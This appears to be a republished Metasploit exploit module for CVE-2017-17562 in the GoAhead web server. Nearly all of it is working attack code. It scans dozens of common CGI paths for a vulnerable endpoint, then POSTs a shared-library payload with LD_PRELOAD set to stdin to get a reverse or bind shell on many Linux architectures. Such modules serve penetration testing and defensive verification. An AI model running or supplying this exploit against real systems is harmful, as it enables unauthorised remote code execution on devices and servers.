# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;GoAhead Web Server LD_PRELOAD Arbitrary Module Load&#039;,
      &#039;Description&#039;    => %q{
          This module triggers an arbitrary shared library load vulnerability
        in GoAhead web server versions between 2.5 and that have the CGI module
        enabled.
      },
      &#039;Author&#039;         =>
        [
          &#039;Daniel Hodson <daniel[at]elttam.com.au>&#039;, # Elttam Vulnerability Discovery & Python Exploit
          &#039;h00die&#039;,                                  # Metasploit Module
          &#039;hdm&#039;,                                     # Metasploit Module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-17562&#039; ],
          [ &#039;URL&#039;, &#039;https://www.elttam.com.au/blog/goahead/&#039; ]
        ],
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039;       => 5000,
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;        => &#039;linux&#039;,
      &#039;Targets&#039;         =>
        [
 
          [ &#039;Automatic (Reverse Shell)&#039;,
            { &#039;Arch&#039; => ARCH_CMD, &#039;Platform&#039; => [ &#039;unix&#039; ], &#039;ReverseStub&#039; => true,
              &#039;Payload&#039; => {
                &#039;Compat&#039; => {
                  &#039;PayloadType&#039; => &#039;cmd_reverse_stub&#039;,
                  &#039;ConnectionType&#039; => &#039;reverse&#039;,
                }
              }
            }
          ],
 
          [ &#039;Automatic (Bind Shell)&#039;,
            { &#039;Arch&#039; => ARCH_CMD, &#039;Platform&#039; => [ &#039;unix&#039; ], &#039;BindStub&#039; => true,
              &#039;Payload&#039; => {
                &#039;Compat&#039; => {
                  &#039;PayloadType&#039; => &#039;cmd_bind_stub&#039;,
                  &#039;ConnectionType&#039; => &#039;bind&#039;
                }
              }
            }
          ],
 
          [ &#039;Automatic (Command)&#039;,
            { &#039;Arch&#039; => ARCH_CMD, &#039;Platform&#039; => [ &#039;unix&#039; ] }
          ],
          [ &#039;Linux x86&#039;,        { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Linux x86_64&#039;,     { &#039;Arch&#039; => ARCH_X64 } ],
          [ &#039;Linux ARM (LE)&#039;,   { &#039;Arch&#039; => ARCH_ARMLE } ],
          [ &#039;Linux ARM64&#039;,      { &#039;Arch&#039; => ARCH_AARCH64 } ],
          [ &#039;Linux MIPS&#039;,       { &#039;Arch&#039; => ARCH_MIPS } ],
          [ &#039;Linux MIPSLE&#039;,     { &#039;Arch&#039; => ARCH_MIPSLE } ],
          [ &#039;Linux MIPS64&#039;,     { &#039;Arch&#039; => ARCH_MIPS64 } ],
          [ &#039;Linux MIPS64LE&#039;,   { &#039;Arch&#039; => ARCH_MIPS64LE } ],
 
          # PowerPC stubs are currently over the 16384 maximum POST size
          # [ &#039;Linux PPC&#039;,        { &#039;Arch&#039; => ARCH_PPC } ],
          # [ &#039;Linux PPC64&#039;,      { &#039;Arch&#039; => ARCH_PPC64 } ],
          # [ &#039;Linux PPC64 (LE)&#039;, { &#039;Arch&#039; => ARCH_PPC64LE } ],
 
          [ &#039;Linux SPARC&#039;,      { &#039;Arch&#039; => ARCH_SPARC } ],
          [ &#039;Linux SPARC64&#039;,    { &#039;Arch&#039; => ARCH_SPARC64 } ],
          [ &#039;Linux s390x&#039;,      { &#039;Arch&#039; => ARCH_ZARCH } ],
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SHELL&#039;      => &#039;/bin/sh&#039;,
        },
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => &#039;Dec 18 2017&#039;, # June 9th, technically, via github commit.
      &#039;DefaultTarget&#039;   => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGET_URI&#039;, [false, &#039;The path to a CGI script on the GoAhead server&#039;])
      ])
  end
 
  # Setup our mapping of Metasploit architectures to gcc architectures
  def setup
    super
    @@payload_arch_mappings = {
        ARCH_X86      => [ &#039;x86&#039; ],
        ARCH_X64      => [ &#039;x86_64&#039; ],
        ARCH_MIPS     => [ &#039;mips&#039; ],
        ARCH_MIPSLE   => [ &#039;mipsel&#039; ],
        ARCH_MIPSBE   => [ &#039;mips&#039; ],
        ARCH_MIPS64   => [ &#039;mips64&#039; ],
        ARCH_MIPS64LE => [ &#039;mips64el&#039; ],
 
        # PowerPC stubs are currently over the 16384 maximum POST size
        # ARCH_PPC      => [ &#039;powerpc&#039; ],
        # ARCH_PPC64    => [ &#039;powerpc64&#039; ],
        # ARCH_PPC64LE  => [ &#039;powerpc64le&#039; ],
 
        ARCH_SPARC    => [ &#039;sparc&#039; ],
        ARCH_SPARC64  => [ &#039;sparc64&#039; ],
        ARCH_ARMLE    => [ &#039;armel&#039;, &#039;armhf&#039; ],
        ARCH_AARCH64  => [ &#039;aarch64&#039; ],
        ARCH_ZARCH    => [ &#039;s390x&#039; ],
    }
 
    # Architectures we don&#039;t offically support but can shell anyways with interact
    @@payload_arch_bonus = %W{
      mips64el sparc64 s390x
    }
 
    # General platforms (OS + C library)
    @@payload_platforms = %W{
      linux-glibc
    }
  end
 
  # Use fancy payload wrappers to make exploitation a joyously lazy exercise
  def cycle_possible_payloads
    template_base = ::File.join(Msf::Config.data_directory, "exploits", "CVE-2017-17562")
    template_list = []
    template_type = nil
    template_arch = nil
 
    # Handle the generic command types first
    if target.arch.include?(ARCH_CMD)
 
      # Default to a system() template
      template_type = &#039;system&#039;
 
      # Handle reverse_tcp() templates
      if target[&#039;ReverseStub&#039;]
        template_type = &#039;reverse&#039;
      end
 
      # Handle reverse_tcp() templates
      if target[&#039;BindStub&#039;]
        template_type = &#039;bind&#039;
      end
 
      all_architectures = @@payload_arch_mappings.values.flatten.uniq
 
      # Prioritize the most common architectures first
      %W{ x86_64 x86 armel armhf mips mipsel }.each do |t_arch|
        template_list << all_architectures.delete(t_arch)
      end
 
      # Queue up the rest for later
      all_architectures.each do |t_arch|
        template_list << t_arch
      end
 
    # Handle the specific architecture targets next
    else
      template_type = &#039;shellcode&#039;
      target.arch.each do |t_name|
        @@payload_arch_mappings[t_name].each do |t_arch|
          template_list << t_arch
        end
      end
    end
 
    # Remove any duplicates that may have snuck in
    template_list.uniq!
 
    # Cycle through each top-level platform we know about
    @@payload_platforms.each do |t_plat|
 
      # Cycle through each template and yield
      template_list.each do |t_arch|
 
 
        wrapper_path = ::File.join(template_base, "goahead-cgi-#{template_type}-#{t_plat}-#{t_arch}.so.gz")
        unless ::File.exist?(wrapper_path)
          raise RuntimeError.new("Missing executable template at #{wrapper_path}")
        end
 
        data = &#039;&#039;
        ::File.open(wrapper_path, "rb") do |fd|
          data = Rex::Text.ungzip(fd.read)
        end
 
        pidx = data.index(&#039;PAYLOAD&#039;)
        if pidx
          data[pidx, payload.encoded.length] = payload.encoded
        end
 
        if %W{reverse bind}.include?(template_type)
          pidx = data.index("55555")
          if pidx
            data[pidx, 5] = datastore[&#039;LPORT&#039;].to_s.ljust(5)
          end
        end
 
        if &#039;reverse&#039; == template_type
          pidx = data.index("000.000.000.000")
          if pidx
            data[pidx, 15] = datastore[&#039;LHOST&#039;].to_s.ljust(15)
          end
        end
 
        vprint_status("Using payload wrapper &#039;goahead-cgi-#{template_type}-#{t_arch}&#039;...")
        yield(data)
 
        # Introduce a small delay for the payload to stage
        Rex.sleep(0.50)
 
        # Short-circuit once we have a session
        return if session_created?
      end
    end
  end
 
  # Start the shell train
  def exploit
    # Find a valid CGI target
    target_uri = find_target_cgi
    return unless target_uri
 
    # Create wrappers for each potential architecture
    cycle_possible_payloads do |wrapped_payload|
 
      # Trigger the vulnerability and run the payload
      trigger_payload(target_uri, wrapped_payload)
      return if session_created?
    end
  end
 
  # Determine whether the target is exploitable
  def check
    # Find a valid CGI target
    target_uri = find_target_cgi
    unless target_uri
      return Exploit::CheckCode::Unknown
    end
    return Exploit::CheckCode::Vulnerable
  end
 
  # Upload and LD_PRELOAD execute the shared library payload
  def trigger_payload(target_uri, wrapped_payload)
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri),
      &#039;vars_get&#039; => {
        &#039;LD_PRELOAD&#039; => &#039;/proc/self/fd/0&#039;
      },
      &#039;data&#039; => wrapped_payload
    })
 
    nil
  end
 
  # Find an exploitable CGI endpoint. These paths were identified by mining Sonar HTTP datasets
  def find_target_cgi
 
    target_uris = []
    common_dirs = %W^
/
/cgi-bin/
/cgi/
^
    common_exts = ["", ".cgi"]
    common_cgis = %W^
admin
apply
non-CA-rev
checkCookie
check_user
chn/liveView
cht/liveView
cnswebserver
config
configure/set_link_neg
configure/swports_adjust
eng/liveView
firmware
getCheckCode
get_status
getmac
getparam
guest/Login
home
htmlmgr
index
index/login
jscript
kvm
liveView
login
login.asp
login/login
login/login-page
login_mgr
luci
main
main-cgi
manage/login
menu
mlogin
netbinary
nobody/Captcha
nobody/VerifyCode
normal_userLogin
otgw
page
rulectl
service
set_new_config
sl_webviewer
ssi
status
sysconf
systemutil
t/out
top
unauth
upload
variable
wanstatu
webcm
webmain
webproc
webscr
webviewLogin
webviewLogin_m64
webviewer
welcome
cgitest
^
 
    if datastore[&#039;TARGET_URI&#039;].to_s.length > 0
      target_uris << datastore[&#039;TARGET_URI&#039;]
    end
 
    common_dirs.each do |cgi_dir|
      common_cgis.each do |cgi_path|
        common_exts.each do |cgi_ext|
          target_uris << "#{cgi_dir}#{cgi_path}#{cgi_ext}"
        end
      end
    end
 
    print_status("Searching #{target_uris.length} paths for an exploitable CGI endpoint...")
 
    target_uris.each do |uri|
      if is_cgi_exploitable?(uri)
        print_good("Exploitable CGI located at #{uri}")
        return uri
      end
    end
 
    print_error("No valid CGI endpoints identified")
    return
  end
 
  # Use the output of LD_DEBUG=help to determine whether an endpoint is exploitable
  def is_cgi_exploitable?(uri)
    res = send_request_cgi({&#039;uri&#039; => uri, &#039;method&#039; => &#039;POST&#039;, &#039;vars_get&#039; => { &#039;LD_DEBUG&#039; => &#039;help&#039; }})
 
    if res
      vprint_status("Request for #{uri} returned #{res.code}: #{res.message}")
    else
      vprint_status("Request for #{uri} did not return a response")
    end
 
    !!(res && res.body && res.body.to_s.include?("LD_DEBUG_OUTPUT"))
  end
 
  # This sometimes determines if the CGI module is enabled, but doesn&#039;t seem
  # to return the error to the client in newer versions. Unused for now.
  def is_cgi_enabled?
    return true
    res = send_request_cgi({&#039;uri&#039; => "/cgi-bin"})
    !!(res && res.body && res.body.to_s.include?("Missing CGI name"))
  end
end

